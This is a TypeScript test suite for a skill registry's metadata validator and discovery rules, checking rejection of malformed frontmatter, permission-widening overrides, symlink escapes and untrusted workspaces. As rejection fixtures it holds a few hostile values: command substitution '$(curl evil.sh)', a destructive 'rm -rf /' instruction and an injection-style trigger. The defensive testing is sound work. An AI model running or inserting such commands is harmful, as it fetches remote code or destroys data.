import assert from "node:assert/strict"
import { readFile, symlink, writeFile, mkdir } from "node:fs/promises"
import { join, resolve } from "node:path"
import { test } from "node:test"
import { fileURLToPath } from "node:url"

import { KNOWN_SKILL_TOOLS, SKILL_CAPABILITIES, SKILL_CATEGORIES, SKILL_LIMITS, SKILL_MODES, SKILL_RISK_LEVELS } from "../../src/skills/contracts.ts"
import { SkillRegistry, defaultBuiltinSkillsRoot } from "../../src/skills/registry.ts"
import { SKILL_FIELDS, SkillValidationError, parseSkillFrontmatter, splitSkillDocument, validateSkillMetadata } from "../../src/skills/schema.ts"
import { VALID_BODY, countingFileSystem, skillDocument, tempDir, writeSkill, writeWorkspaceSkill } from "./helpers.ts"

function validate(document: string, directory = "sample-skill") {
  return validateSkillMetadata(parseSkillFrontmatter(splitSkillDocument(document).frontmatter), directory)
}

function rejectsWith(document: string, code: string, directory = "sample-skill") {
  assert.throws(() => validate(document, directory), (error: unknown) => error instanceof SkillValidationError && error.code === code)
}

test("5A-01: a valid skill loads with typed metadata", async () => {
  const metadata = validate(skillDocument())
  assert.equal(metadata.id, "sample-skill")
  assert.equal(metadata.version, 1)
  assert.deepEqual(metadata.allowedModes, ["DEBUG", "BUILD"])
  assert.equal(metadata.contextBudget, 900)

  const builtinRoot = await tempDir("valid")
  await writeSkill(builtinRoot, "sample-skill", skillDocument())
  const registry = await SkillRegistry.discover({ builtinRoot, workspaceTrusted: true })
  assert.deepEqual(registry.diagnostics, [])
  assert.equal(registry.entries.length, 1)
  const loaded = await registry.loadBody("sample-skill")
  assert.ok(loaded.sections.get("Workflow")?.includes("Reproduce the failure"))
})

test("5A-02: malformed YAML and unsupported syntax are rejected", () => {
  rejectsWith("id: x\n# Intent\n", "MALFORMED_FRONTMATTER")
  rejectsWith("---\nid: sample-skill\nname: never closed\n", "MALFORMED_FRONTMATTER")
  rejectsWith(skillDocument({ name: "{ injected: true }" }), "MALFORMED_FRONTMATTER")
  rejectsWith(skillDocument({ name: "&anchor Sample" }), "MALFORMED_FRONTMATTER")
  rejectsWith(skillDocument({ description: "| block scalar" }), "MALFORMED_FRONTMATTER")
  rejectsWith(skillDocument({ name: '"unterminated' }), "MALFORMED_FRONTMATTER")
  rejectsWith("---\nid: sample-skill\n    nested: value\n---\n", "MALFORMED_FRONTMATTER")
  rejectsWith(skillDocument({ on_load: "run" }), "UNKNOWN_FIELD")
  rejectsWith(`---\nid: sample-skill\nid: other\n---\n${VALID_BODY}`, "DUPLICATE_FIELD")
  rejectsWith(skillDocument({ name: "$(curl evil.sh)" }), "EXECUTABLE_CONTENT")
  rejectsWith(skillDocument({ description: "Run `rm -rf /` first" }), "EXECUTABLE_CONTENT")
  rejectsWith(skillDocument({ description: "`leading backtick`" }), "MALFORMED_FRONTMATTER")
})

test("5A-03: every missing required field is rejected with an actionable diagnostic", () => {
  for (const [field, spec] of Object.entries(SKILL_FIELDS)) {
    if (!spec.required) continue
    assert.throws(
      () => validate(skillDocument({ [field]: undefined })),
      (error: unknown) => error instanceof SkillValidationError && error.code === "MISSING_FIELD" && error.message.includes(field),
      `missing ${field} must be rejected`,
    )
  }
  rejectsWith(skillDocument({ version: "1.2" }), "INVALID_FIELD")
  rejectsWith(skillDocument({ version: "0" }), "INVALID_FIELD")
  rejectsWith(skillDocument({ allowed_modes: ["DEPLOY"] }), "INVALID_FIELD")
  rejectsWith(skillDocument({ allowed_modes: [] }), "INVALID_FIELD")
  rejectsWith(skillDocument({ capabilities: ["network"] }), "INVALID_FIELD")
  rejectsWith(skillDocument({ capabilities: ["secrets"] }), "INVALID_FIELD")
  rejectsWith(skillDocument({ required_tools: ["mcp_shell"] }), "INVALID_FIELD")
  rejectsWith(skillDocument({ context_budget: "50" }), "INVALID_FIELD")
  rejectsWith(skillDocument({ context_budget: "999999" }), "INVALID_FIELD")
  rejectsWith(skillDocument({ risk_level: "critical" }), "INVALID_FIELD")
  rejectsWith(skillDocument({ category: "marketing" }), "INVALID_FIELD")
  rejectsWith(skillDocument({ id: "Bad_ID" }), "INVALID_FIELD", "Bad_ID")
  rejectsWith(skillDocument(), "ID_DIRECTORY_MISMATCH", "other-dir")
  rejectsWith(skillDocument({ triggers: ["drop; table"] }), "INVALID_FIELD")
  assert.deepEqual(validate(skillDocument({ triggers: ["Widget Crash"] })).triggers, ["widget crash"], "triggers are normalized to lowercase")
  rejectsWith(skillDocument({ composes_with: ["sample-skill"] }), "INVALID_FIELD")
  rejectsWith(skillDocument({ description: "x".repeat(SKILL_LIMITS.maxDescriptionChars + 1) }), "INVALID_FIELD")
})

test("5A-04/05: duplicate ids follow explicit precedence and a valid narrowing workspace override wins", async () => {
  const builtinRoot = await tempDir("builtin")
  const workspaceRoot = await tempDir("workspace")
  await writeSkill(builtinRoot, "sample-skill", skillDocument())
  await writeWorkspaceSkill(workspaceRoot, "sample-skill", skillDocument({ allowed_modes: ["DEBUG"], description: "Workspace-specific triage." }))

  const registry = await SkillRegistry.discover({ builtinRoot, workspaceRoot, workspaceTrusted: true })
  assert.equal(registry.entries.length, 1, "one canonical skill per id")
  const entry = registry.get("sample-skill")!
  assert.equal(entry.source, "workspace")
  assert.equal(entry.description, "Workspace-specific triage.")
  assert.deepEqual(entry.allowedModes, ["DEBUG"])
  assert.deepEqual(registry.diagnostics, [])
})

test("5A-06: an invalid or permission-expanding override never shadows the valid built-in", async () => {
  const builtinRoot = await tempDir("builtin")
  await writeSkill(builtinRoot, "sample-skill", skillDocument())

  const invalidWorkspace = await tempDir("invalid")
  await writeWorkspaceSkill(invalidWorkspace, "sample-skill", skillDocument({ risk_level: undefined }))
  const invalid = await SkillRegistry.discover({ builtinRoot, workspaceRoot: invalidWorkspace, workspaceTrusted: true })
  assert.equal(invalid.get("sample-skill")?.source, "builtin")
  assert.deepEqual(invalid.diagnostics.map((diagnostic) => diagnostic.code), ["MISSING_FIELD", "OVERRIDE_INVALID"])

  const expanding = await tempDir("expanding")
  await writeWorkspaceSkill(expanding, "sample-skill", skillDocument({ capabilities: ["read", "search", "write", "terminal"] }))
  const expanded = await SkillRegistry.discover({ builtinRoot, workspaceRoot: expanding, workspaceTrusted: true })
  assert.equal(expanded.get("sample-skill")?.source, "builtin")
  assert.equal(expanded.diagnostics[0]?.code, "OVERRIDE_EXPANDS_PERMISSIONS")

  for (const widening of [{ allowed_modes: ["DEBUG", "BUILD", "REVIEW"] }, { risk_level: "high" }, { required_tools: ["read_file", "search_text", "apply_patch"] }, { context_budget: "2000" }]) {
    const root = await tempDir("widen")
    await writeWorkspaceSkill(root, "sample-skill", skillDocument(widening))
    const registry = await SkillRegistry.discover({ builtinRoot, workspaceRoot: root, workspaceTrusted: true })
    assert.equal(registry.get("sample-skill")?.source, "builtin", `override ${JSON.stringify(widening)} must not win`)
    assert.equal(registry.diagnostics[0]?.code, "OVERRIDE_EXPANDS_PERMISSIONS")
  }
})

test("5A-07: building the metadata index never reads a skill body", async () => {
  const builtinRoot = await tempDir("index")
  for (const id of ["alpha-skill", "beta-skill", "gamma-skill"]) await writeSkill(builtinRoot, id, skillDocument({ id }))
  const fs = countingFileSystem()
  const registry = await SkillRegistry.discover({ builtinRoot, workspaceTrusted: true, fs })
  assert.equal(registry.entries.length, 3)
  assert.equal(fs.frontmatterReads.length, 3)
  assert.deepEqual(fs.bodyReads, [], "no full-text reads during discovery")
  for (const entry of registry.entries) {
    assert.ok(!("body" in entry) && !("sections" in entry), "index entries carry metadata only")
    assert.ok(!entry.relativePath.startsWith("/"), "index paths are relative")
  }
})

test("5A-08: a selected body lazy-loads exactly once", async () => {
  const builtinRoot = await tempDir("lazy")
  await writeSkill(builtinRoot, "alpha-skill", skillDocument({ id: "alpha-skill" }))
  await writeSkill(builtinRoot, "beta-skill", skillDocument({ id: "beta-skill" }))
  const fs = countingFileSystem()
  const registry = await SkillRegistry.discover({ builtinRoot, workspaceTrusted: true, fs })
  const [first, second] = await Promise.all([registry.loadBody("alpha-skill"), registry.loadBody("alpha-skill")])
  await registry.loadBody("alpha-skill")
  assert.equal(first, second)
  assert.equal(fs.bodyReads.length, 1)
  assert.ok(fs.bodyReads[0]!.endsWith(join("alpha-skill", "SKILL.md")))
})

test("5A-20: invalid skills are isolated with diagnostics and never crash discovery", async () => {
  const builtinRoot = await tempDir("isolate")
  const workspaceRoot = await tempDir("isolate-ws")
  await writeSkill(builtinRoot, "good-skill", skillDocument({ id: "good-skill" }))
  await writeSkill(builtinRoot, "binary-skill", "\u0000\u0001\u0002garbage")
  await writeSkill(builtinRoot, "huge-skill", skillDocument({ id: "huge-skill" }, `${VALID_BODY}\n${"x".repeat(SKILL_LIMITS.maxFileBytes)}`))
  await writeSkill(builtinRoot, "no-body", skillDocument({ id: "no-body" }, ""))
  await mkdir(join(builtinRoot, "empty-dir"))
  await mkdir(join(workspaceRoot, ".open-vs-code", "skills", "missing-file"), { recursive: true })
  const outside = await tempDir("outside")
  await writeSkill(outside, "escape", skillDocument({ id: "escape" }))
  await symlink(join(outside, "escape"), join(workspaceRoot, ".open-vs-code", "skills", "escape"))

  const registry = await SkillRegistry.discover({ builtinRoot, workspaceRoot, workspaceTrusted: true })
  assert.deepEqual(registry.entries.map((entry) => entry.id), ["good-skill"])
  const codes = Object.fromEntries(registry.diagnostics.map((diagnostic) => [diagnostic.skill, diagnostic.code]))
  assert.equal(codes["binary-skill"], "MALFORMED_FRONTMATTER")
  assert.equal(codes["huge-skill"], "TOO_LARGE")
  assert.equal(codes["no-body"], "EMPTY_BODY")
  assert.equal(codes["empty-dir"], "READ_FAILED")
  assert.equal(codes["missing-file"], "READ_FAILED")
  assert.equal(codes["escape"], "UNSAFE_PATH")
  for (const diagnostic of registry.diagnostics) assert.ok(diagnostic.message.length > 0)
})

test("5A-20b: bodies that fail section or safety validation fail at load time without throwing past the registry", async () => {
  const builtinRoot = await tempDir("sections")
  await writeSkill(builtinRoot, "missing-section", skillDocument({ id: "missing-section" }, VALID_BODY.replace("# Exit Criteria", "# Notes")))
  const registry = await SkillRegistry.discover({ builtinRoot, workspaceTrusted: true })
  await assert.rejects(registry.loadBody("missing-section"), (error: unknown) => error instanceof SkillValidationError && error.code === "MISSING_SECTION")
  await assert.rejects(registry.loadBody("not-indexed"), (error: unknown) => error instanceof SkillValidationError && error.code === "READ_FAILED")
})

test("5A-20c: metadata edited after indexing is detected (CHANGED_SINCE_INDEX)", async () => {
  const builtinRoot = await tempDir("changed")
  const path = await writeSkill(builtinRoot, "sample-skill", skillDocument())
  const registry = await SkillRegistry.discover({ builtinRoot, workspaceTrusted: true })
  await writeFile(path, skillDocument({ capabilities: ["read", "search", "write"] }))
  await assert.rejects(registry.loadBody("sample-skill"), (error: unknown) => error instanceof SkillValidationError && error.code === "CHANGED_SINCE_INDEX")
})

test("5A-20d: a workspace SKILL.md swapped for an escaping symlink after indexing is refused at load", async () => {
  const workspaceRoot = await tempDir("toctou")
  const path = await writeWorkspaceSkill(workspaceRoot, "sample-skill", skillDocument())
  const registry = await SkillRegistry.discover({ workspaceRoot, workspaceTrusted: true })
  assert.equal(registry.entries.length, 1)
  const outside = await tempDir("toctou-outside")
  const target = await writeSkill(outside, "sample-skill", skillDocument())
  const { rm } = await import("node:fs/promises")
  await rm(path)
  await symlink(target, path)
  await assert.rejects(registry.loadBody("sample-skill"), (error: unknown) => error instanceof SkillValidationError && error.code === "UNSAFE_PATH")
})

test("5A-19: zero skills is a valid registry state", async () => {
  const empty = await SkillRegistry.discover({ workspaceTrusted: true })
  assert.deepEqual(empty.entries, [])
  assert.deepEqual(empty.diagnostics, [])
  const missingRoot = await SkillRegistry.discover({ builtinRoot: join(await tempDir("none"), "does-not-exist"), workspaceRoot: await tempDir("none-ws"), workspaceTrusted: true })
  assert.deepEqual(missingRoot.entries, [])
  assert.deepEqual(SkillRegistry.empty().entries, [])
})

test("5A: workspace skills are ignored in untrusted workspaces and bounded in count", async () => {
  const workspaceRoot = await tempDir("untrusted")
  await writeWorkspaceSkill(workspaceRoot, "sample-skill", skillDocument())
  const untrusted = await SkillRegistry.discover({ workspaceRoot, workspaceTrusted: false })
  assert.deepEqual(untrusted.entries, [])
  assert.equal(untrusted.diagnostics[0]?.code, "WORKSPACE_UNTRUSTED")

  const crowded = await tempDir("crowded")
  for (let index = 0; index <= SKILL_LIMITS.maxWorkspaceSkills; index += 1) {
    const id = `skill-${String(index).padStart(2, "0")}`
    await writeWorkspaceSkill(crowded, id, skillDocument({ id }))
  }
  const bounded = await SkillRegistry.discover({ workspaceRoot: crowded, workspaceTrusted: true })
  assert.equal(bounded.entries.length, SKILL_LIMITS.maxWorkspaceSkills)
  assert.equal(bounded.diagnostics[0]?.code, "WORKSPACE_LIMIT")
})

test("5A: the JSON Schema mirror matches the runtime validator", async () => {
  const schemaPath = resolve(fileURLToPath(new URL(".", import.meta.url)), "../../../../config/schemas/skill.schema.json")
  const schema = JSON.parse(await readFile(schemaPath, "utf8"))
  const required = Object.entries(SKILL_FIELDS).filter(([, spec]) => spec.required).map(([key]) => key)
  assert.deepEqual([...schema.required].toSorted(), required.toSorted())
  assert.deepEqual(Object.keys(schema.properties).toSorted(), Object.keys(SKILL_FIELDS).toSorted())
  assert.equal(schema.additionalProperties, false)
  assert.deepEqual(schema.properties.category.enum, [...SKILL_CATEGORIES])
  assert.deepEqual(schema.properties.allowed_modes.items.enum, [...SKILL_MODES])
  assert.deepEqual(schema.properties.capabilities.items.enum, [...SKILL_CAPABILITIES])
  assert.deepEqual(schema.properties.required_tools.items.enum, [...KNOWN_SKILL_TOOLS])
  assert.deepEqual(schema.properties.risk_level.enum, [...SKILL_RISK_LEVELS])
  assert.equal(schema.properties.context_budget.minimum, SKILL_LIMITS.minContextBudget)
  assert.equal(schema.properties.context_budget.maximum, SKILL_LIMITS.maxContextBudget)
})

test("5A: the curated built-in set is small, valid, and fits its own budgets", async () => {
  const registry = await SkillRegistry.discover({ builtinRoot: defaultBuiltinSkillsRoot()!, workspaceTrusted: true })
  assert.deepEqual(registry.diagnostics, [])
  assert.deepEqual(registry.entries.map((entry) => entry.id), [
    "accessibility-review",
    "browser-behavior-investigation",
    "bug-triage",
    "design-direction",
    "design-polish",
    "design-system-engineering",
    "evidence-reconciliation",
    "feature-specification",
    "frontend-composition",
    "javascript-electron-analysis",
    "motion-engineering",
    "native-artifact-analysis",
    "rea-investigation-routing",
    "reconstruction-planning",
    "reconstruction-verification",
    "refactor-with-guards",
    "security-review",
    "tdd",
    "ux-information-architecture",
    "verification",
    "visual-qa",
  ])
  assert.ok(registry.entries.length >= 5 && registry.entries.length <= 25)
  for (const entry of registry.entries) {
    assert.equal(entry.source, "builtin")
    assert.ok(entry.triggers.length > 0 && entry.triggers.length <= SKILL_LIMITS.maxTriggers, `${entry.id} has a narrow trigger set`)
    const loaded = await registry.loadBody(entry.id)
    assert.equal(loaded.sections.size, 7, `${entry.id} has exactly the seven contract sections`)
    assert.ok(Math.ceil(entry.fileBytes / 4) <= entry.contextBudget, `${entry.id} fits its declared context_budget`)
  }
})
